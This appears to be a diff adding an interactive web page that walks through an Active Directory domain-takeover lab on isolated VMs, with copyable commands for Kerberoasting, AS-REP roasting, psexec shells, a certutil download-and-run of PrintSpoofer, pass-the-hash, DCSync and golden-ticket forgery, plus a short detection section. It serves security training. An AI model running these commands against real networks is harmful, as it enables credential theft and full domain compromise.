@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Active Directory Domain Takeover Lab</title>
+  <script crossorigin src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
+  <script crossorigin src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
+  <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    html { scroll-behavior: smooth; }
+    body {
+      background: #0a0c10;
+      color: #cdd6f4;
+      font-family: 'IBM Plex Mono', 'Fira Code', monospace;
+      font-size: 13px;
+      line-height: 1.7;
+    }
+    @import url('https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@300;400;500;600;700&family=Orbitron:wght@700;900&display=swap');
+    ::-webkit-scrollbar { width: 4px; }
+    ::-webkit-scrollbar-track { background: #12151c; }
+    ::-webkit-scrollbar-thumb { background: #313244; border-radius: 2px; }
+  </style>
+</head>
+<body>
+  <div id="root"></div>
+
+  <script type="text/babel">
+const { useState } = React;
+
+const phases = [
+  {
+    id: 0, code: "00", label: "Lab Setup", color: "#64ffda", icon: "⚙",
+    summary: "Build the vulnerable AD environment in VirtualBox",
+    steps: [
+      { title: "Network Architecture", content: `Three-VM lab on an isolated Host-Only network:\n\n• Kali Linux (Attacker)   — 192.168.56.10\n• Windows Server 2019 DC  — 192.168.56.100  (CORP.LOCAL)\n• Windows 10 Workstation  — 192.168.56.101  (domain-joined)`, commands: [] },
+      { title: "VirtualBox Network Setup", content: "Create a Host-Only adapter so all VMs share a private segment with no internet exposure.", commands: ["# VirtualBox → File → Host Network Manager", "# Create: vboxnet0 → 192.168.56.1/24, DHCP disabled", "# Assign all three VMs: Adapter 1 → Host-Only (vboxnet0)"] },
+      { title: "DC Configuration (PowerShell as Admin)", content: "Promote the Server to a Domain Controller and seed intentional misconfigurations.", commands: ["# Set static IP", 'New-NetIPAddress -InterfaceAlias "Ethernet" -IPAddress 192.168.56.100 -PrefixLength 24 -DefaultGateway 192.168.56.1', "", "# Install AD DS", "Install-WindowsFeature AD-Domain-Services -IncludeManagementTools", "", "# Promote to DC", 'Install-ADDSForest -DomainName "corp.local" -SafeModeAdministratorPassword (ConvertTo-SecureString "P@ssw0rd123!" -AsPlainText -Force) -Force'] },
+      { title: "Install BloodHound CE on Kali", content: "BloodHound Community Edition runs via Docker and maps attack paths.", commands: ["sudo apt update && sudo apt install -y docker.io docker-compose", "sudo systemctl enable --now docker", "", "curl -L https://ghst.ly/getbhce -o docker-compose.yml", "sudo docker compose up -d", "", "# Access UI at http://localhost:8080"] }
+    ]
+  },
+  {
+    id: 1, code: "01", label: "Recon & Enumeration", color: "#ffb347", icon: "🔍",
+    summary: "Map the domain without credentials first, then authenticated",
+    steps: [
+      { title: "Unauthenticated SMB Fingerprinting", content: "Identify the DC, domain name, and open services before you have any credentials.", commands: ["# Ping sweep", "nmap -sn 192.168.56.0/24", "", "# Port scan DC", "nmap -sCV -p 53,88,135,139,389,445,464,636,3268,3269 192.168.56.100"] },
+      { title: "AS-REP Roasting (No Creds)", content: "Harvest TGTs for accounts that have pre-authentication disabled.", commands: ["python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py \\", "  corp.local/ -dc-ip 192.168.56.100 -no-pass -usersfile /usr/share/seclists/Usernames/top-usernames-shortlist.txt \\", "  -format hashcat -outputfile asrep_hashes.txt"] },
+      { title: "Authenticated Enumeration (CrackMapExec)", content: "Now that you have jdoe's creds, enumerate users, groups, shares, and password policy.", commands: ["crackmapexec smb 192.168.56.100 -u jdoe -p Welcome1 --users", "crackmapexec smb 192.168.56.100 -u jdoe -p Welcome1 --groups"] }
+    ]
+  },
+  {
+    id: 2, code: "02", label: "Initial Foothold", color: "#ff6b6b", icon: "⚡",
+    summary: "Kerberoast service accounts and crack TGS tickets offline",
+    steps: [
+      { title: "Kerberoasting", content: "Request TGS tickets for all SPNs. Any domain user can do this — no special privs needed.", commands: ["python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py \\", "  corp.local/jdoe:Welcome1 -dc-ip 192.168.56.100 \\", "  -request -outputfile kerberoast_hashes.txt"] },
+      { title: "Gain Shell via PSExec", content: "Use svc_sql creds to get an interactive shell on the DC or workstation.", commands: ["python3 /usr/share/doc/python3-impacket/examples/psexec.py \\", "  corp.local/svc_sql:'Summer2023!'@192.168.56.100"] }
+    ]
+  },
+  {
+    id: 3, code: "03", label: "Local Privilege Escalation", color: "#c678dd", icon: "⬆",
+    summary: "Escalate from service account to local SYSTEM",
+    steps: [
+      { title: "Token Impersonation — PrintSpoofer", content: "If svc_sql has SeImpersonatePrivilege (common for service accounts), impersonate SYSTEM.", commands: ["certutil -urlcache -split -f http://192.168.56.10:8000/PrintSpoofer64.exe C:\\\\Temp\\\\ps.exe", "", "C:\\\\Temp\\\\ps.exe -i -c cmd"] }
+    ]
+  },
+  {
+    id: 4, code: "04", label: "Lateral Movement", color: "#56b6c2", icon: "↔",
+    summary: "Pivot across hosts using Pass-the-Hash and Overpass-the-Hash",
+    steps: [
+      { title: "Pass-the-Hash (PtH)", content: "NT hashes work for NTLM auth — no plaintext password needed. Move laterally without cracking.", commands: ["crackmapexec smb 192.168.56.0/24 \\", "  -u Administrator -H <NT_HASH> --local-auth"] }
+    ]
+  },
+  {
+    id: 5, code: "05", label: "Domain Compromise", color: "#e06c75", icon: "👑",
+    summary: "DCSync, Golden Ticket, and full domain persistence",
+    steps: [
+      { title: "DCSync — Replicate All Hashes", content: "If you have DS-Replication-Get-Changes-All rights (DA, helpdesk via ACL abuse), pull the entire NTDS.", commands: ["python3 /usr/share/doc/python3-impacket/examples/secretsdump.py \\", "  corp.local/svc_sql:'Summer2023!'@192.168.56.100 -just-dc"] },
+      { title: "Golden Ticket Forgery", content: "The krbtgt hash lets you forge TGTs for ANY user, including fake Domain Admins.", commands: ["mimikatz # kerberos::golden \\", "  /user:Administrator \\", "  /domain:corp.local \\", "  /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \\", "  /krbtgt:<KRBTGT_NT_HASH>"] }
+    ]
+  },
+  {
+    id: 6, code: "06", label: "Detection & Defense", color: "#98c379", icon: "🛡",
+    summary: "Understand what defenders see — and how to harden against each technique",
+    steps: [
+      { title: "Windows Event Log Signatures", content: "Key Event IDs to monitor for each attack technique in this lab.", commands: ["# Kerberoasting", "Event 4769 — Kerberos Service Ticket request with Encryption Type 0x17 (RC4)", "", "# DCSync", "Event 4662 — DS-Replication-Get-Changes-All from non-DC machine"] }
+    ]
+  }
+];
+
+function ADLab() {
+  const [activePhase, setActivePhase] = useState(0);
+  const [expandedStep, setExpandedStep] = useState(null);
+  const [copied, setCopied] = useState(null);
+
+  const phase = phases[activePhase];
+
+  const copyCmd = (text, key) => {
+    navigator.clipboard.writeText(text);
+    setCopied(key);
+    setTimeout(() => setCopied(null), 1500);
+  };
+
+  const toggleStep = (i) => setExpandedStep(expandedStep === i ? null : i);
+
+  return (
+    <div style={{ minHeight: "100vh", background: "#0a0c10", color: "#cdd6f4", display: "flex", flexDirection: "column" }}>
+      <style>{`
+        @keyframes slideIn { from { opacity:0; transform:translateX(-10px); } to { opacity:1; transform:none; } }
+        .phase-btn { transition: all .2s; cursor: pointer; border: none; }
+        .phase-btn:hover { transform: translateX(2px); }
+        .step-card { transition: border-color .2s; }
+        .cmd-line:hover { background: rgba(255,255,255,.04); }
+        .copy-btn { opacity: 0; transition: opacity .15s; }
+        .cmd-block:hover .copy-btn { opacity: 1; }
+      `}</style>
+
+      {/* Header */}
+      <div style={{ background: "linear-gradient(135deg, #12151c 0%, #1a1d2e 100%)", borderBottom: "1px solid #1e2030", padding: "20px 28px", color: "#cdd6f4" }}>
+        <div style={{ color: "#e06c75", fontSize: 10, letterSpacing: 4, marginBottom: 4 }}>ACTIVE DIRECTORY ▸ PRIVILEGE ESCALATION</div>
+        <div style={{ fontFamily: "Orbitron, monospace", fontSize: 20, fontWeight: 900, lineHeight: 1.2 }}>FULL DOMAIN TAKEOVER LAB</div>
+        <div style={{ color: "#6c7086", fontSize: 11, marginTop: 5 }}>Kali · Windows Server 2019 · BloodHound · CrackMapExec · Mimikatz · Impacket</div>
+      </div>
+
+      <div style={{ display: "flex", flex: 1, minHeight: 0 }}>
+        {/* Sidebar */}
+        <div style={{ width: 200, minWidth: 200, background: "#0d0f16", borderRight: "1px solid #1e2030", padding: "16px 0", display: "flex", flexDirection: "column", gap: 4, overflowY: "auto" }}>
+          {phases.map((p, i) => {
+            const active = i === activePhase;
+            return (
+              <button key={i} className="phase-btn" onClick={() => { setActivePhase(i); setExpandedStep(null); }} style={{ background: active ? `${p.color}18` : "transparent", borderLeft: active ? `3px solid ${p.color}` : "3px solid transparent", borderRight: "none", borderTop: "none", borderBottom: "none", padding: "10px 14px", textAlign: "left", color: active ? p.color : "#6c7086", display: "flex", flexDirection: "column", gap: 3 }}>
+                <span style={{ fontSize: 9, opacity: .6, letterSpacing: 1 }}>{p.icon} {p.code}</span>
+                <div style={{ fontSize: 11, fontWeight: 600, lineHeight: 1.3 }}>{p.label}</div>
+              </button>
+            );
+          })}
+        </div>
+
+        {/* Main Content */}
+        <div style={{ flex: 1, overflowY: "auto", padding: "20px 24px" }}>
+          {/* Phase Header */}
+          <div style={{ background: `${phase.color}0d`, border: `1px solid ${phase.color}30`, borderRadius: 8, padding: "14px 18px", marginBottom: 20, display: "flex", alignItems: "center", gap: 14 }}>
+            <div style={{ fontSize: 28 }}>{phase.icon}</div>
+            <div style={{ flex: 1 }}>
+              <div style={{ color: phase.color, fontSize: 11, letterSpacing: 3, marginBottom: 3 }}>PHASE {phase.code}</div>
+              <div style={{ fontSize: 17, fontWeight: 700, fontFamily: "Orbitron, monospace" }}>{phase.label}</div>
+              <div style={{ color: "#6c7086", fontSize: 11, marginTop: 3 }}>{phase.summary}</div>
+            </div>
+          </div>
+
+          {/* Steps */}
+          {phase.steps.map((step, si) => {
+            const stepKey = `${activePhase}-${si}`;
+            const isOpen = expandedStep === si;
+            const cmdText = step.commands.join("\n");
+
+            return (
+              <div key={si} className="step-card" style={{ background: isOpen ? "#12151c" : "#0d0f16", border: `1px solid ${isOpen ? "#313244" : "#1e2030"}`, borderRadius: 7, marginBottom: 10, overflow: "hidden" }}>
+                <div onClick={() => toggleStep(si)} style={{ display: "flex", alignItems: "center", gap: 12, padding: "12px 16px", cursor: "pointer" }}>
+                  <div style={{ width: 22, height: 22, borderRadius: 4, flexShrink: 0, background: "#1e2030", display: "flex", alignItems: "center", justifyContent: "center", fontSize: 11, color: "#585b70", fontWeight: 700 }}>{si + 1}</div>
+                  <div style={{ flex: 1, fontWeight: 600, color: "#cdd6f4", fontSize: 12 }}>{step.title}</div>
+                  <span style={{ color: "#6c7086", fontSize: 14 }}>{isOpen ? "▾" : "▸"}</span>
+                </div>
+
+                {isOpen && (
+                  <div style={{ borderTop: "1px solid #1e2030" }}>
+                    {step.content && (
+                      <div style={{ padding: "12px 16px", color: "#a6adc8", fontSize: 12, lineHeight: 1.7, whiteSpace: "pre-wrap", borderBottom: step.commands.length ? "1px solid #1e2030" : "none" }}>
+                        {step.content}
+                      </div>
+                    )}
+
+                    {step.commands.length > 0 && (
+                      <div className="cmd-block" style={{ position: "relative" }}>
+                        <button className="copy-btn" onClick={() => copyCmd(cmdText, stepKey)} style={{ position: "absolute", top: 8, right: 12, background: copied === stepKey ? "#64ffda22" : "#1e2030", border: "1px solid #313244", borderRadius: 4, color: copied === stepKey ? "#64ffda" : "#6c7086", fontSize: 10, padding: "3px 10px", cursor: "pointer", letterSpacing: 1, zIndex: 1 }}>
+                          {copied === stepKey ? "COPIED ✓" : "COPY ALL"}
+                        </button>
+                        <div style={{ padding: "12px 16px 14px", overflowX: "auto" }}>
+                          {step.commands.map((line, li) => {
+                            const isComment = line.startsWith("#");
+                            return (
+                              <div key={li} className="cmd-line" style={{ padding: "1px 6px", borderRadius: 3, margin: "1px 0", color: isComment ? "#585b70" : "#a6e3a1", lineHeight: 1.7 }}>
+                                {!isComment && <span style={{ color: "#89dceb" }}>$ </span>}
+                                <span>{line}</span>
+                              </div>
+                            );
+                          })}
+                        </div>
+                      </div>
+                    )}
+                  </div>
+                )}
+              </div>
+            );
+          })}
+
+          {/* Nav */}
+          <div style={{ display: "flex", justifyContent: "space-between", marginTop: 20, gap: 12 }}>
+            <button disabled={activePhase === 0} onClick={() => { setActivePhase(p => p - 1); setExpandedStep(null); }} style={{ background: "transparent", border: "1px solid #313244", borderRadius: 6, color: activePhase === 0 ? "#313244" : "#cdd6f4", padding: "8px 18px", cursor: activePhase === 0 ? "default" : "pointer", fontSize: 12 }}>
+              ← Previous Phase
+            </button>
+            <button disabled={activePhase === phases.length - 1} onClick={() => { setActivePhase(p => p + 1); setExpandedStep(null); }} style={{ background: activePhase === phases.length - 1 ? "transparent" : phases[activePhase].color, border: "none", borderRadius: 6, color: activePhase === phases.length - 1 ? "#313244" : "#0a0c10", padding: "8px 18px", cursor: activePhase === phases.length - 1 ? "default" : "pointer", fontSize: 12, fontWeight: 700 }}>
+              Next Phase →
+            </button>
+          </div>
+        </div>
+      </div>
+    </div>
+  );
+}
+
+const root = ReactDOM.createRoot(document.getElementById('root'));
+root.render(<ADLab />);
+  </script>
+</body>
+</html>
